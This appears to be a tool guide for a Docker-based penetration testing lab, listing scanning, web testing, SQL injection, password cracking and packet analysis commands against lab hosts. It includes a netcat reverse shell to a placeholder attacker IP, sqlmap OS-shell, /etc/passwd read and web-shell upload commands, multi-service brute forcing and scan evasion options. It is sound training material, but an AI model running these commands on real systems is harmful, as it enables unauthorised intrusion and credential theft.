# Security Tools Guide

Comprehensive guide to all penetration testing tools available in the Docker Security Lab environment.

## Network Scanning Tools

### Nmap - Network Mapper

#### Basic Usage
```bash
# Basic host discovery
nmap -sn vulnerable-web
nmap -sn 172.17.0.0/16  # Scan Docker network

# Port scanning
nmap vulnerable-web                    # Top 1000 ports
nmap -p- vulnerable-web               # All ports
nmap -p 22,80,443,3306 vulnerable-web # Specific ports
```

#### Advanced Scanning
```bash
# Service version detection
nmap -sV vulnerable-web

# OS fingerprinting
nmap -O vulnerable-web

# Aggressive scan (combines -sV, -sC, -O)
nmap -A vulnerable-web

# Stealth SYN scan
nmap -sS vulnerable-web

# UDP scan
nmap -sU vulnerable-web
```

#### Nmap Scripting Engine (NSE)
```bash
# Vulnerability scripts
nmap --script vuln vulnerable-web
nmap --script http-vuln* vulnerable-web

# HTTP enumeration
nmap --script http-enum vulnerable-web
nmap --script http-headers vulnerable-web
nmap --script http-methods vulnerable-web

# SSH enumeration
nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt vulnerable-ssh
nmap --script ssh-hostkey,ssh-auth-methods vulnerable-ssh

# Database scripts
nmap --script mysql-info,mysql-empty-password vulnerable-db
```

#### Output Formats
```bash
# Save results in multiple formats
nmap -A vulnerable-web -oA scan_results  # All formats
nmap -A vulnerable-web -oN scan.txt      # Normal format
nmap -A vulnerable-web -oX scan.xml      # XML format
nmap -A vulnerable-web -oG scan.gnmap    # Grepable format
```

### Masscan - High-Speed Port Scanner
```bash
# Fast port scanning (if available)
masscan -p1-65535 172.17.0.0/16 --rate=1000
```

## Web Application Testing Tools

### Nikto - Web Vulnerability Scanner

#### Basic Scanning
```bash
# Basic web server scan
nikto -h http://vulnerable-web

# Verbose output
nikto -h http://vulnerable-web -v

# Scan specific port
nikto -h http://vulnerable-web -p 8080
```

#### Advanced Options
```bash
# Use all plugins
nikto -h http://vulnerable-web -Plugins @@ALL

# Specific plugin categories
nikto -h http://vulnerable-web -Plugins @@DEFAULT
nikto -h http://vulnerable-web -Plugins outdated,headers

# Custom User-Agent
nikto -h http://vulnerable-web -useragent "Mozilla/5.0 Custom Scanner"

# Authentication
nikto -h http://vulnerable-web -id admin:password
```

#### Output and Reporting
```bash
# Save results to file
nikto -h http://vulnerable-web -o nikto_results.txt
nikto -h http://vulnerable-web -o nikto_results.html -Format html
nikto -h http://vulnerable-web -o nikto_results.xml -Format xml
```

### Dirb - Directory Brute Forcer

#### Basic Directory Enumeration
```bash
# Default wordlist scan
dirb http://vulnerable-web

# Custom wordlist
dirb http://vulnerable-web /usr/share/dirb/wordlists/common.txt
dirb http://vulnerable-web /usr/share/dirb/wordlists/big.txt
```

#### Advanced Features
```bash
# File extensions
dirb http://vulnerable-web -X .php,.txt,.bak,.old

# Recursive scanning
dirb http://vulnerable-web -r

# Custom headers
dirb http://vulnerable-web -H "User-Agent: Custom Scanner"

# Authentication
dirb http://vulnerable-web -u admin:password

# Ignore specific response codes
dirb http://vulnerable-web -N 404,403
```

#### Output Options
```bash
# Save results
dirb http://vulnerable-web -o dirb_results.txt

# Silent mode (only found directories)
dirb http://vulnerable-web -S
```

### Gobuster - Fast Directory/File Brute Forcer
```bash
# Directory enumeration
gobuster dir -u http://vulnerable-web -w /usr/share/wordlists/dirb/common.txt

# File enumeration with extensions
gobuster dir -u http://vulnerable-web -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

# DNS subdomain enumeration
gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt
```

## SQL Injection Testing

### SQLMap - Automated SQL Injection Tool

#### Basic Usage
```bash
# Automatic form detection and testing
sqlmap -u "http://vulnerable-web" --forms --batch

# Test specific parameter
sqlmap -u "http://vulnerable-web" --data="username=test&password=test" -p username

# GET parameter testing
sqlmap -u "http://vulnerable-web/search.php?id=1"
```

#### Database Enumeration
```bash
# List databases
sqlmap -u "http://vulnerable-web" --forms --batch --dbs

# List tables in specific database
sqlmap -u "http://vulnerable-web" --forms --batch -D webapp --tables

# List columns in specific table
sqlmap -u "http://vulnerable-web" --forms --batch -D webapp -T users --columns

# Dump specific table
sqlmap -u "http://vulnerable-web" --forms --batch -D webapp -T users --dump
```

#### Advanced Exploitation
```bash
# OS shell access
sqlmap -u "http://vulnerable-web" --forms --batch --os-shell

# File system access
sqlmap -u "http://vulnerable-web" --forms --batch --file-read="/etc/passwd"
sqlmap -u "http://vulnerable-web" --forms --batch --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# SQL shell
sqlmap -u "http://vulnerable-web" --forms --batch --sql-shell
```

#### Customization Options
```bash
# Risk and level settings
sqlmap -u "http://vulnerable-web" --forms --batch --level=5 --risk=3

# Custom injection techniques
sqlmap -u "http://vulnerable-web" --forms --batch --technique=BEUSTQ

# Threading for faster execution
sqlmap -u "http://vulnerable-web" --forms --batch --threads=10

# Custom User-Agent and headers
sqlmap -u "http://vulnerable-web" --forms --batch --user-agent="Custom Scanner" --headers="X-Custom: value"
```

## Password Cracking and Brute Force

### Hydra - Network Login Cracker

#### SSH Brute Force
```bash
# Single user, single password
hydra -l admin -p admin ssh://vulnerable-ssh:22

# Single user, password list
hydra -l admin -P passwords.txt ssh://vulnerable-ssh:22

# User list, password list
hydra -L users.txt -P passwords.txt ssh://vulnerable-ssh:22

# Parallel connections
hydra -L users.txt -P passwords.txt ssh://vulnerable-ssh:22 -t 4
```

#### HTTP Form Brute Force
```bash
# HTTP POST form
hydra -L users.txt -P passwords.txt vulnerable-web http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -L users.txt -P passwords.txt vulnerable-web http-get /admin/
```

#### Other Services
```bash
# FTP brute force
hydra -L users.txt -P passwords.txt ftp://vulnerable-ftp:21

# MySQL brute force
hydra -L users.txt -P passwords.txt mysql://vulnerable-db:3306

# SMTP brute force
hydra -L users.txt -P passwords.txt smtp://mail-server:25
```

#### Advanced Options
```bash
# Custom success/failure conditions
hydra -L users.txt -P passwords.txt ssh://vulnerable-ssh:22 -e nsr

# Verbose output
hydra -L users.txt -P passwords.txt ssh://vulnerable-ssh:22 -V

# Resume session
hydra -L users.txt -P passwords.txt ssh://vulnerable-ssh:22 -R
```

### John the Ripper - Password Cracker
```bash
# Crack password hashes (if available)
john --wordlist=passwords.txt hashes.txt
john --show hashes.txt

# Generate password variations
john --wordlist=passwords.txt --rules hashes.txt
```

### Hashcat - Advanced Password Recovery
```bash
# Dictionary attack
hashcat -m 0 -a 0 hashes.txt passwords.txt

# Brute force attack
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a
```

## Network Analysis Tools

### Netcat - Network Swiss Army Knife

#### Basic Connectivity Testing
```bash
# Test port connectivity
nc -zv vulnerable-web 80
nc -zv vulnerable-ssh 22

# Banner grabbing
nc vulnerable-web 80
echo "GET / HTTP/1.1\r\nHost: vulnerable-web\r\n\r\n" | nc vulnerable-web 80
```

#### File Transfer
```bash
# Send file (receiver)
nc -l -p 4444 > received_file.txt

# Send file (sender)
nc vulnerable-web 4444 < file_to_send.txt
```

#### Reverse Shell
```bash
# Listener (attacker machine)
nc -l -p 4444

# Reverse shell (target machine)
nc attacker_ip 4444 -e /bin/bash
```

### TCPDump - Network Packet Analyzer
```bash
# Capture all traffic
tcpdump -i eth0

# Capture HTTP traffic
tcpdump -i eth0 port 80

# Capture and save to file
tcpdump -i eth0 -w capture.pcap

# Read from file
tcpdump -r capture.pcap
```

### Wireshark/TShark - Advanced Packet Analysis
```bash
# Command-line packet analysis
tshark -i eth0 -f "port 80"
tshark -r capture.pcap -Y "http.request.method == GET"
```

## Manual Testing Tools

### Curl - Command Line HTTP Client

#### Basic HTTP Requests
```bash
# GET request
curl http://vulnerable-web
curl -v http://vulnerable-web  # Verbose output
curl -I http://vulnerable-web  # Headers only

# POST request
curl -X POST http://vulnerable-web -d "username=admin&password=test"
curl -X POST http://vulnerable-web -d @data.txt  # Data from file
```

#### Advanced Features
```bash
# Custom headers
curl -H "User-Agent: Custom Scanner" http://vulnerable-web
curl -H "X-Forwarded-For: 127.0.0.1" http://vulnerable-web

# Cookies
curl -b "session=abc123" http://vulnerable-web
curl -c cookies.txt http://vulnerable-web  # Save cookies

# File upload
curl -F "upload=@file.txt" http://vulnerable-web/upload.php

# Follow redirects
curl -L http://vulnerable-web

# Proxy usage
curl --proxy http://proxy:8080 http://vulnerable-web
```

#### Authentication
```bash
# Basic authentication
curl -u admin:password http://vulnerable-web/admin

# Digest authentication
curl --digest -u admin:password http://vulnerable-web/admin
```

### Wget - File Downloader
```bash
# Download file
wget http://vulnerable-web/file.txt

# Recursive download
wget -r http://vulnerable-web/

# Mirror website
wget -m http://vulnerable-web/

# Custom User-Agent
wget --user-agent="Custom Scanner" http://vulnerable-web/
```

## Specialized Tools

### Enum4linux - SMB Enumeration
```bash
# Basic SMB enumeration
enum4linux vulnerable-server

# Detailed enumeration
enum4linux -a vulnerable-server
```

### SMBClient - SMB/CIFS Client
```bash
# List shares
smbclient -L //vulnerable-server

# Connect to share
smbclient //vulnerable-server/share -U username
```

### SNMP Tools
```bash
# SNMP walk
snmpwalk -v2c -c public vulnerable-server

# SNMP get
snmpget -v2c -c public vulnerable-server 1.3.6.1.2.1.1.1.0
```

## Tool Combination Strategies

### Automated Reconnaissance Pipeline
```bash
#!/bin/bash
# Automated recon script

TARGET="vulnerable-web"

# Network discovery
nmap -sn 172.17.0.0/16 | grep "Nmap scan report" > live_hosts.txt

# Port scanning
nmap -sS -sV -sC $TARGET -oA port_scan

# Web enumeration
nikto -h http://$TARGET -o nikto_results.txt
dirb http://$TARGET -o dirb_results.txt

# Vulnerability assessment
nmap --script vuln $TARGET -oN vuln_scan.txt
```

### Web Application Testing Workflow
```bash
#!/bin/bash
# Web app testing workflow

URL="http://vulnerable-web"

# Technology identification
whatweb $URL

# Directory enumeration
dirb $URL /usr/share/dirb/wordlists/common.txt

# Vulnerability scanning
nikto -h $URL

# SQL injection testing
sqlmap -u $URL --forms --batch --level=3

# Manual testing checklist
echo "Manual tests to perform:"
echo "1. Test for XSS in all input fields"
echo "2. Check for directory traversal"
echo "3. Test file upload functionality"
echo "4. Check for command injection"
```

## Tool Configuration and Optimization

### Performance Tuning
```bash
# Nmap timing templates
nmap -T0 vulnerable-web  # Paranoid (slowest)
nmap -T1 vulnerable-web  # Sneaky
nmap -T2 vulnerable-web  # Polite
nmap -T3 vulnerable-web  # Normal (default)
nmap -T4 vulnerable-web  # Aggressive
nmap -T5 vulnerable-web  # Insane (fastest)

# Parallel processing
nmap --min-parallelism 10 --max-parallelism 20 vulnerable-web
```

### Stealth Techniques
```bash
# Fragmented packets
nmap -f vulnerable-web

# Decoy scanning
nmap -D RND:10 vulnerable-web

# Source port spoofing
nmap --source-port 53 vulnerable-web

# Timing delays
nmap --scan-delay 1s vulnerable-web
```

## Best Practices

### Documentation
- Always save tool outputs with timestamps
- Use consistent naming conventions for files
- Document command parameters and reasoning
- Create summary reports of findings

### Ethical Usage
- Only test systems you own or have permission to test
- Respect rate limits and system resources
- Document all activities for learning purposes
- Report vulnerabilities responsibly

### Tool Selection
- Choose appropriate tools for specific tasks
- Combine automated and manual testing
- Verify automated tool results manually
- Understand tool limitations and false positives

### Continuous Learning
- Stay updated with new tool versions
- Learn new techniques and methodologies
- Practice on legal testing environments
- Participate in security communities and CTFs
